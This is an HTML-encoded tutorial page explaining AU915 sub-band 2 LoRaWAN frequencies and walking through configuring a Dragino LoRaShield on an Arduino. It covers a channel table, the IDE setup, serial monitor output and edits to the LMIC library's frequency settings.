&lt;h2 id=&quot;australian-and-new-zealand-frequencies&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#australian-and-new-zealand-frequencies&quot; aria-label=&quot;australian and new zealand frequencies permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Australian and New Zealand Frequencies&lt;/h2&gt;
&lt;p&gt;To operate LoRaWAN in Australia and New Zealand, a device should use the radio frequencies specified by the LoRaWAN standard. This allows interoperation, as well as operating radio devices within the regulations specified by the government. The standardized LoRaWAN frequencies for Australia and New Zealand range from 915 MHz to 930 MHz frequency. In the world of LoRaWAN, this standardization is more commonly known as &lt;em&gt;AU915&lt;/em&gt;. This information is documented in the official frequency plans: the LoRaWAN 1.0.2 Specification. More specifically, a companion document named &lt;a href=&quot;https://www.scribd.com/document/337679415/LoRaWAN-Regional-Parameters-v1-0-20161012-1397-1&quot;&gt;LoRaWAN Regional Parameters&lt;/a&gt; outlines the frequencies for use in different countries.&lt;/p&gt;
&lt;p&gt;AU915 allows for a total of 73 possible channels to use within the 915 MHz to 930 MHz frequency. Most LoRa networks in Australia seem to have made a consensus to only use a specific portion of this, that is, a specific band of channels in the frequency range. The consensus is: use of channels 8 to 15 on the AU915 specification. This is also known as AU915 sub-band 2. This band in the specification that is implemented in the TTN server source code and is documented and distributed in the &lt;a href=&quot;https://github.com/TheThingsNetwork/gateway-conf/blob/master/AU-global_conf.json&quot;&gt;global_conf.json&lt;/a&gt; gateway configuration file distributed by TTN. Furthermore, the TTN community has specified the AU915 frequencies and channels on their &lt;a href=&quot;https://www.thethingsnetwork.org/wiki/LoRaWAN/Frequencies/Frequency-Plans&quot;&gt;LoRaWAN Frequencies&lt;/a&gt; page. Therefore, this makes the channel choice logical for this project, as we want a legal and standardized LoRaWAN solution.&lt;/p&gt;
&lt;p&gt;The entire point of the task is to get the Dragino LoRaShield to operate in the specified AU915 frequency range, and specifically, sub-band 2. Therefore, it is first prudent to document the required channels and their respective properties. The table below displays the available upstream and downstream channels for AU915 sub-band 2.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;Channel&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Direction&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Frequency (MHz)&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Bandwidth (kHz)&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Data Rate&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;916.8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;9&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;917.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;10&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;917.2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;11&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;917.4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;12&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;917.6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;13&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;917.8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;14&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;918.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;15&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;918.2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;125&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR0 - DR3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;65&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;up&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;917.5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;923.3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;923.9&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;924.5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;925.1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;925.7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;926.3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;926.9&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;down&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;927.5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;500&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;DR8 - DR13&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;walkthrough&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#walkthrough&quot; aria-label=&quot;walkthrough permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Walkthrough&lt;/h2&gt;
&lt;p&gt;This section covers a complete and thorough walkthrough for installing an AU915 sketch onto an Arduino shield and operation of an attached Dragino LoRaShield. A &lt;em&gt;Windows 10 environment&lt;/em&gt; is used for the walkthrough. However, the same process can easily be achieved on Linux, however, some of the instructions will vary.&lt;/p&gt;
&lt;h3 id=&quot;hardware-overview&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#hardware-overview&quot; aria-label=&quot;hardware overview permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Hardware Overview&lt;/h3&gt;
&lt;p&gt;The &lt;a href=&quot;http://www.dragino.com/products/module/item/102-lora-shield.html&quot;&gt;Dragino LoRaShield&lt;/a&gt; is an affordable Arduino shield for prototype development of LoRaWAN devices. The device is excellent for a prototype node. The version used in this project in the US900 version - however, this device is not specifically supported for the AU915 specification. A photo of the device is included below for reference. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 390px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/43af761bbb85372eafebaee07587e89a/e52b6/Lora_Shield_v1.4.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 85.44303797468356%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAARABQDASIAAhEBAxEB/8QAGQABAAIDAAAAAAAAAAAAAAAAAAMEAQIF/8QAFwEAAwEAAAAAAAAAAAAAAAAAAAEDAv/aAAwDAQACEAMQAAABtY3pZp2kRztxDJgH/8QAGhAAAwEBAQEAAAAAAAAAAAAAAQIDAAQhMv/aAAgBAQABBQK3X7HoIUVU6vNijMZQCJh9b//EABYRAQEBAAAAAAAAAAAAAAAAAAERIP/aAAgBAwEBPwECY//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8BH//EAB0QAAIBBAMAAAAAAAAAAAAAAAABEQIDMVEgYZH/2gAIAQEABj8CdNlS9kVy+zI3b8EqVGyHnh//xAAbEAEAAwADAQAAAAAAAAAAAAABABEhEDGRQf/aAAgBAQABPyFCi+LMIUHTZCsPs0+rVuMSinxKoX2Xjs4//9oADAMBAAIAAwAAABD4P0D/xAAZEQACAwEAAAAAAAAAAAAAAAAAARARITH/2gAIAQMBAT8Q0ujoUf/EABgRAAIDAAAAAAAAAAAAAAAAAAARARAh/9oACAECAQE/EJbNv//EAB8QAQABAwQDAAAAAAAAAAAAAAERACExEEFRYYGx8P/aAAgBAQABPxBoKW8Prlp5BARllzY24q2h2ketqgSRbdG38NWIrJz0aHzpkLn4pxrP/9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Dragino LoraShield v1.4&quot;
        title=&quot;Dragino LoraShield v1.4&quot;
        src=&quot;/static/43af761bbb85372eafebaee07587e89a/e52b6/Lora_Shield_v1.4.jpg&quot;
        srcset=&quot;/static/43af761bbb85372eafebaee07587e89a/ff44c/Lora_Shield_v1.4.jpg 158w,
/static/43af761bbb85372eafebaee07587e89a/a6688/Lora_Shield_v1.4.jpg 315w,
/static/43af761bbb85372eafebaee07587e89a/e52b6/Lora_Shield_v1.4.jpg 390w&quot;
        sizes=&quot;(max-width: 390px) 100vw, 390px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Attaching the LoRaWAN shield to an Arduino is a very simple process. Just plug the shield into the matching pins available. Plug and play! &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Make sure you have the US900 version of the Dragino LoRaShield. The version information is available on the bottom of the PCB board. A box on the PCB should be ticked to illustrate the specific model.&lt;/p&gt;
&lt;h3 id=&quot;setup-arduino-ide&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#setup-arduino-ide&quot; aria-label=&quot;setup arduino ide permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Setup Arduino IDE&lt;/h3&gt;
&lt;p&gt;Download and install the Arduino IDE. &lt;a href=&quot;https://www.arduino.cc/en/Guide/Windows&quot;&gt;These instructions for installation on Windows&lt;/a&gt; should provide enough information.&lt;/p&gt;
&lt;h3 id=&quot;download-repo-and-flash-arduino&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#download-repo-and-flash-arduino&quot; aria-label=&quot;download repo and flash arduino permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Download Repo and Flash Arduino&lt;/h3&gt;
&lt;p&gt;This repo and the library can be added to the Arduino IDE library using a variety of methods. These are outlined below:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Clone this git repository into your sketchbook/libraries folder. In Windows the specific directory is &lt;code class=&quot;language-text&quot;&gt;C:\Users\&amp;lt;username&gt;\My Documents\Arduino\libraries\&amp;lt;library folder&gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Install it using the Arduino Library manager (“Sketch” -&gt; “Include Library” -&gt; “Manage Libraries…“)&lt;/li&gt;
&lt;li&gt;Download a zip file from GitHub using the “Download ZIP” button and install it using the Arduino IDE (“Sketch” -&gt; “Include Library” -&gt; “Add .ZIP Library…“)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;For more information on using Arduino libraries, see &lt;a href=&quot;https://www.arduino.cc/en/Guide/Libraries&quot;&gt;https://www.arduino.cc/en/Guide/Libraries&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now we want to open the &lt;code class=&quot;language-text&quot;&gt;Dragino_LoRaShield_AU915.ino&lt;/code&gt; sketch file in the Arduino IDE. The sketch file is available in the &lt;code class=&quot;language-text&quot;&gt;/examples&lt;/code&gt; directory in this repo. This specific sketch file is a modified version of the original sketch provided with the Dragino LoRaShield provided on &lt;a href=&quot;http://wiki.dragino.com/index.php?title=Lora_Shield&quot;&gt;the Dragino Wiki&lt;/a&gt; for the US900 version, available directly from &lt;a href=&quot;https://github.com/dragino/Lora/blob/master/Lora%20Shield/Examples/lora_shield_ttn-915-fix-frequency/lora_shield_ttn-915-fix-frequency.ino&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Make sure your Arduino and LoRaShield are attached to the host computer via USB. Now, upload the sketch to Arduino, by selecting “Upload” which will compile and upload the sketch to the device.&lt;/p&gt;
&lt;p&gt;Finally, open serial monitor so we can view output from the device and ensure it is functioning correctly. Set the serial monitor baud to 115200. You should see output similar to that below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Starting
Packet queued for freq: 916800000
132794: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 917000000
1515422: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 917200000
2898055: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 917400000
4280688: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 917600000
5663319: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 917800000
7045951: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 918000000
8428658: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 918200000
9811291: EV_TXCOMPLETE (includes waiting for RX windows)
Packet queued for freq: 916800000
11193937: EV_TXCOMPLETE (includes waiting for RX windows)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the output, you should see packets queued for sending on 8 specific channels. Each channel is displayed as the frequency used when sending a packet. The node should send a packet, then the channel should either: 1) Move to the next channel; or 2) If at the end of the channel list, jump back to the first channel. In the listing above, packets started sending on channel 8 (916.8 MHz) and cycled through the remaining 7 channels before looping back to channel 8 again.&lt;/p&gt;
&lt;h3 id=&quot;lorawan-library-configuration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#lorawan-library-configuration&quot; aria-label=&quot;lorawan library configuration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;LoRaWAN Library Configuration&lt;/h3&gt;
&lt;p&gt;For the sake of complete documentation, this section summarises the changes made to the original source code used in this project. To reiterate, two sources were used to create the required files for this project:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/matthijskooijman/arduino-lmic&quot;&gt;Fork of the LMIC project modified for use on Arduinos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dragino/Lora/blob/master/Lora%20Shield/Examples/lora_shield_ttn-915-fix-frequency/lora_shield_ttn-915-fix-frequency.ino&quot;&gt;Arduino sketch (.ino file) for the LoRaShield provide by Dragino&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;A summary of changes to the source code are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Modify the LMIC fork to use the US915 frequency&lt;/li&gt;
&lt;li&gt;Modify the LMIC fork US915 frequency to adhere to the AU915 standard&lt;/li&gt;
&lt;li&gt;Modify the LMIC fork disableChannel() function to use the correct channel step&lt;/li&gt;
&lt;li&gt;Modify the Arduino sketch to disable the correct channels (to only enable band 2 in AU915)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The changes made are more thoroughly documented in the following subsections.&lt;/p&gt;
&lt;h3 id=&quot;lmic-fork&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#lmic-fork&quot; aria-label=&quot;lmic fork permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;LMIC Fork&lt;/h3&gt;
&lt;p&gt;The LMIC library used in this project is a pre-existing fork of the IMB LoRaMAC-in-C. To quote the original author: the fork is &lt;em&gt;the IBM LMIC (LoraMAC-in-C) library, slightly modified to run in the Arduino environment, allowing using the SX1272, SX1276 transceivers and compatible modules.&lt;/em&gt; This section outlines the modifications to the library that have been made. Firstly, all modification have been made in the src folder, and sub-folder named lmic, as documented below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Dragino_LoRaShield_Node_AU915/src/lmic&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-text&quot;&gt;config.h&lt;/code&gt; comment out line 8:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;//#define CFG_eu868 1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-text&quot;&gt;config.h&lt;/code&gt; uncomment line 9:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CFG_us915&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This change specified that we should use the US915 specification. However, even though we just changed the frequency to US915 we will not use this specification… we just hijacked this definition for ease of implementation. Therefore, we need to update the ecisting US915 MHz code for the AU915 specification. In the &lt;code class=&quot;language-text&quot;&gt;lorabase.h&lt;/code&gt; file, change lines 117 to 126 to:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; US915_125kHz_UPFBASE &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;915200000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
       US915_125kHz_UPFSTEP &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;200000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
       US915_500kHz_UPFBASE &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;915900000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
       US915_500kHz_UPFSTEP &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;1600000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
       US915_500kHz_DNFBASE &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;923300000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
       US915_500kHz_DNFSTEP &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;600000&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
